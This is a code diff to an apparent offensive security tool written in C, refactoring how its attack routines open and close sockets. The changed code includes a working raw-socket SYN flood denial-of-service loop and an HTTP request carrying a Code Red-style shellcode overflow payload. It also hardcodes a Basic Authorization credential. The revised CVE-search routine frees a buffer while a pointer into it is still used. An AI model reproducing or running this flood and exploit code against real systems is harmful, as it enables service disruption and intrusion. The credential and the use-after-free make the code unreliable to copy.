@@ -10,6 +10,7 @@
 #include "../auditing-cybersecurity.h"
 #include "../others/networking.h"
 #include "../activities/activities.h"
+#include <unistd.h>
 
 int any(int type){
 	FILE *f=NULL;
@@ -39,25 +40,26 @@ int any(int type){
 		}
 		fclose(f);
 		for(int i=0;i<msgs && cancelCurrentProcess==FALSE;i++){
-			if(serverResp!=NULL) free(serverResp);
-			format_strings_from_files(queries[i], msg);
-			int bytesRecv=send_msg_to_server(target.targetIp, NULL, portUnderHacking, target.portsToScan[get_port_index(portUnderHacking)].connectionType,msg,&serverResp,BUFFER_SIZE_128K,0);
-			if(bytesRecv<0) continue;
-			if(bytesRecv>0 && strcmp(serverResp,"")!=0){
-				printf("  Msg: %s%s%s\n",C_HWHITE,queries[i],C_DEFAULT);
-				show_message(serverResp,bytesRecv, 0, RESULT_MESSAGE, TRUE);
-				printf("\n");
-			}
+			int sk=0;
+			ssize_t c=format_strings_from_files(queries[i], msg);
+			//free(serverResp);
+			int bytesRecv=send_msg_to_server(&sk,target.targetIp, NULL, portUnderHacking, target.portsToScan[get_port_index(portUnderHacking)].connectionType,
+					msg,&serverResp,BUFFER_SIZE_128K,0,c);
+			if(bytesRecv<=0) continue;
+			printf("  Msg: %s%s%s\n",C_HWHITE,queries[i],C_DEFAULT);
+			show_message(serverResp,bytesRecv, 0, RESULT_MESSAGE, TRUE);
+			printf("\n");
+			close(sk);
 		}
-		if(serverResp!=NULL) free(serverResp);
+		free(serverResp);
 		free_char_double_pointer(&queries,msgs);
 		break;
 		case ANY_DOS_SYN_FLOOD_ATTACK:
 			printf("DOS SYN Flood running...\n");
 			srand(time(0));
-			int sk=socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-			setsockopt(sk, SOL_SOCKET, SO_BINDTODEVICE, networkInfo.interfaceName, strlen(networkInfo.interfaceName));
-			if(sk<0) return SOCKET_SETOPT_ERROR;
+			int skDos=socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+			setsockopt(skDos, SOL_SOCKET, SO_BINDTODEVICE, networkInfo.interfaceName, strlen(networkInfo.interfaceName));
+			if(skDos<0) return SOCKET_SETOPT_ERROR;
 			char datagram[4096];
 			struct iphdr *iph = (struct iphdr *) datagram;
 			struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
@@ -97,7 +99,7 @@ int any(int type){
 			tcph->urg_ptr = 0;
 			int one=1;
 			const int *val = &one;
-			if(setsockopt(sk, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) return show_message("setsockopt() error. ",0, errno, ERROR_MESSAGE, TRUE);
+			if(setsockopt(skDos, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) return show_message("setsockopt() error. ",0, errno, ERROR_MESSAGE, TRUE);
 			dest.sin_family=AF_INET;
 			dest.sin_addr.s_addr=target.targetIp.s_addr;
 			tcph->dest=htons(portUnderHacking);
@@ -111,8 +113,9 @@ int any(int type){
 			while(!cancelCurrentProcess){
 				memcpy(&psh.tcp,tcph,sizeof(struct tcphdr));
 				tcph->check=csum((unsigned short*) &psh,sizeof(struct PseudoHeader));
-				if(sendto(sk,datagram,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &dest,sizeof (dest))<0) return SENDING_PACKETS_ERROR;
+				if(sendto(skDos,datagram,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &dest,sizeof (dest))<0) return SENDING_PACKETS_ERROR;
 			}
+			close(skDos);
 			printf("DOS SYN Flood finished...\n\n");
 			break;
 		case ANY_NMAP_VULNER_SCAN:
@@ -126,8 +129,10 @@ int any(int type){
 					"NNNNNN NNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u780"
 					"1%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078"
 					"%u0000%u00=a HTTP/1.0",'\r','\n','\r','\n');
-			int bytesRecv=send_msg_to_server(target.targetIp,NULL, portUnderHacking, target.portsToScan[get_port_index(portUnderHacking)].connectionType
-					,msg,&serverResp,BUFFER_SIZE_128K,0);
+			int sk=0;
+			int bytesRecv=send_msg_to_server(&sk,target.targetIp,NULL, portUnderHacking, target.portsToScan[get_port_index(portUnderHacking)].connectionType
+					,msg,&serverResp,BUFFER_SIZE_128K,0, strlen(msg));
+			close(sk);
 			if(bytesRecv==RETURN_ERROR) show_message("Error creating socket. Maybe the port is blocked. Wait, and try again in a while.",0,0, ERROR_MESSAGE,1);
 			show_message(serverResp,bytesRecv,0, RESULT_MESSAGE, TRUE);
 			if(serverResp!=NULL) free(serverResp);
@@ -260,7 +265,6 @@ int any(int type){
 			PRINT_RESET;
 			break;
 		case ANY_SEARCH_CVE:
-			char *msg=NULL;
 			srand(time(0));
 			char httpMsg[BUFFER_SIZE_512B]="";
 			char *host="www.opencve.io";
@@ -271,7 +275,7 @@ int any(int type){
 			do{
 				cancelCurrentProcess=FALSE;
 				char *serverResp=NULL;
-				msg=get_readline(";=exit)-> ", TRUE);
+				char *msg=get_readline(";=exit)-> ", TRUE);
 				if(strcmp(msg,";")==0) break;
 				for(int i=0;i<strlen(msg);i++){
 					if(msg[i]==' ' || msg[i]=='\"') msg[i]='+';
@@ -282,10 +286,13 @@ int any(int type){
 						"Authorization: Basic THVjaDpMdWlzNzgh\r\n"
 						"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
 						"Accept: */*\r\n\r\n",msg,host);
-				int bytesRecv=0;
-				if((bytesRecv=send_msg_to_server(ip,host, 443, SSL_CONN_TYPE, httpMsg, &serverResp, BUFFER_SIZE_16K,30000))<0) return RETURN_ERROR;
+				free(msg);
+				int bytesRecv=0, sk=0;
+				if((bytesRecv=send_msg_to_server(&sk,ip,host, 443, SSL_CONN_TYPE, httpMsg, &serverResp, BUFFER_SIZE_16K,30000,strlen(httpMsg)))<0) return RETURN_ERROR;
+				close(sk);
 				char *token="\"id\": \"";
 				char *json=strstr(serverResp,token);
+				free(serverResp);
 				if(json==NULL){
 					show_message("No results found.", strlen("No results found."), 0, INFO_MESSAGE, TRUE);
 					PRINT_RESET;
@@ -331,7 +338,6 @@ int any(int type){
 					cveId++;
 				}
 				PRINT_RESET;
-				free(serverResp);
 			}while(TRUE);
 			break;
 		default:
